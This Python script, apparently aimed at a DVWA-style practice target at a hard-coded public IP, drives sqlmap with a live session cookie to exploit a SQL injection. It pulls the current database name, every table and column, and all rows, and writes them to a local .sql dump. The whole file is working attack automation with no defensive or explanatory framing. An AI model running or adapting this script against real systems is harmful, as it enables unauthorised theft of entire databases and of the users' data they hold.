import os
import re

command = 'python3 /Users/shawn/Github/sqlmap/sqlmap.py -u "http://47.108.248.148:10000/vulnerabilities/sqli/?id=1&Submit=Submit#" -p "id" --cookie="security=low;PHPSESSID=iu4hnd05vbsmhakc5jl7uq58n1" --batch'


# print(command_output)

def get_database():
    print("获取当前数据库中......\n")
    db = "--current-db"
    db_name = ""
    command_output_database = os.popen(command + ' ' + db).readlines()
    for dbs in command_output_database:
        if 'current database:' in dbs:
            dbname = re.findall('[^ ]+', dbs)
            db_name = dbname[2].replace("'", "").replace(" ","")
    # print(db_name)
    print("数据库名获取完成------>", db_name,"\n")
    f = open(db_name + ".sql", "w")
    f2 = ('CREATE DATABASE' + ' ' + db_name.replace('\n', '') + ';' + '\n' + 'USE' + ' ' + db_name.replace('\n','') + ';' + '\n\n')
    f.write(f2)
    f.close()
    get_table(db_name)


def get_table(db_name):
    print("获取表名中......\n")
    tb_num = ''
    i = 0
    tables = "--tables"
    tb_name = []
    command_table = (command + ' ' + '-D' + ' ' + db_name + tables).replace('\n', ' ')
    command_output_tables = os.popen(command_table).readlines()
    for tb in command_output_tables:
        if '|' in tb:
            i = i + 1
            if i > 3:
                tbname = re.findall('[^ ]+', tb)
                tb_name.append(tbname[1])
                # 输出表数
        if 'tables]' in tb:
            tbnum = re.findall('[^ ]+', tb)
            tb_num = tbnum[0].replace("[", "")
    print("表名获取完成------>", tb_name,"\n")
    ## 遍历字段名
    for p in range(int(tb_num)):
        get_columns(db_name, tb_name[p])


def get_columns(db_name, tb_name):
    print("获取", tb_name, "字段中......\n")
    i = 0
    columns = "--columns"
    colum_num = []
    column_name = []

    command_column = (command + ' ' + '-D' + ' ' + db_name + ' ' + '-T' + ' ' + tb_name + ' ' + columns).replace('\n',' ')
    command_output_columns = os.popen(command_column).readlines()
    for colu in command_output_columns:
        # 输出列数,多余1的情况
        if 'columns]' in colu:
            columnum = re.findall('[^ ]+', colu)
            colum_num.append(columnum[0].replace("[", ""))
            print(tb_name,"字段数量获取完成------>", colum_num,"\n")
        elif '[1 column]' in colu:
            columnum = re.findall('[^ ]+', colu)
            colum_num.append(columnum[0].replace("[", ""))
            print(tb_name, "字段数量获取完成------>", colum_num, "\n")
        ## 输出列名
        if '|' in colu:
            i = i + 1
            if i > 4:
                colum = re.findall('[^ ]+', colu)
                column_name.append(colum[1])
    # print(column_name,colum_num)
    print(tb_name,"字段获取完成----->", column_name,"\n")
    create_tables(tb_name, column_name, colum_num,db_name)
    print(tb_name,"表字段写入完成！\n")
    get_dump(db_name, tb_name, column_name, colum_num)


def get_dump(db_name, tb_name, columns, colum_num):
    content_nums = []
    res_list = []
    y = 0
    print("获取", tb_name, "表数据内容中......\n")
    dump = "--dump"
    if int(colum_num[0]) > 1:
        for x in range(0, int(colum_num[0]) - 1):
            ## 处理仅有两条数据的情况
            if x == 0:
                column = columns[x] + ',' + columns[x + 1]
            else:
                column = column + ',' + columns[x + 1]
    ## 处理仅有一个字段的情况
    else:
        column = columns[0]
    command_dump = (command + ' ' + '-D' + ' ' + db_name + ' ' + '-T' + ' ' + tb_name + ' ' + '-C' + ' ' + column + ' ' + dump).replace('\n', ' ')
    # print(command_dump)
    command_output_dump = os.popen(command_dump).readlines()
    # print(command_dump)
    for content in command_output_dump:
        # 输出条数
        if 'entries]' in content:
            content_num = re.findall('[^ ]+', content)
            content_nums.append(content_num[0].replace("[", ""))
            print("获取", tb_name, "表 内容数量完成------>", content_nums,"\n")
        if '|' in content:
            y = y + 1
            if y > 4:
                contents = re.findall('[^|]+',content.replace('\n',''))
                # print(contents)
                for g in contents:
                    res = []
                    mid_ls = g.replace(' ','').replace('<blank>','None').split(',')
                    if len(mid_ls) == 1:
                        for h in mid_ls:
                            res.append(h)
                    res_list.append(res)
                # print(res_list)
                insert_content(tb_name, columns, res_list, colum_num, content_nums,db_name)
                res_list.clear()


def create_tables(table_name, column_name, column_num,db_name):
    print("准备写入", table_name, "表结构","\n")
    create_tables_command = '\n' + 'CREATE TABLE' + ' ' + '`' + table_name + '`' + '('
    ## 写入表头
    f3 = open(db_name + ".sql", "a+")
    f3.write(create_tables_command)
    create_column_command = '`' + column_name[0] + '`' + ' ' + 'VARCHAR(255)'
    finish = ')ENGINE=InnoDB DEFAULT CHARSET=utf8;'
    # 仅一个字段的情况
    if int(column_num[0]) == 1:
        create_column_command = create_column_command + ')' + '' + finish
    else:
        for co_nums in range(int(column_num[0])):
            if co_nums + 1 < int(column_num[0]):
                create_column_command = create_column_command + ',' + '`' + column_name[
                    co_nums + 1] + '`' + ' ' + 'VARCHAR(255)'
            elif co_nums + 1 == int(column_num[0]):
                create_column_command = create_column_command + finish + '\n'
    # print(create_column_command)
    f3.write(create_column_command)
    f3.close()
    print(table_name, "表结构写入完成!\n")


def insert_content(table_name, column_name, data, column_num, data_num,db_name):
    # 取出字段
    column_names = ''
    data_content = ''
    count = 0

    ## 遍历字段
    for i in range(int(column_num[0]) - 1):
        if i == 0:
            column_names = column_name[0] + ',' + column_name[i + 1]
        else:
            column_names = column_names + ',' + column_name[i + 1]
    insert_command = 'INSERT INTO' + ' ' + table_name + '(' + column_names + ')' + 'VALUES' + '('
    ## 遍历数据内容
    f4 = open(db_name + ".sql", "a+")
    for x in range(0,int(column_num[0])):
        if x == 0:
            data_content = "'" + data[x][0] + "'"
        elif x < int(column_num[0]):
            data_content = data_content + "," + "'" + data[x][0] + "'"
    insert_command_start = insert_command + data_content + ');\n'
    f4.write(insert_command_start)
    f4.close()
    print(table_name, "表数据写入中......\n")


if __name__ =="__main__":
    # START ! GOOD LUCK !
    get_database()
    print("数据全部写入完成！")
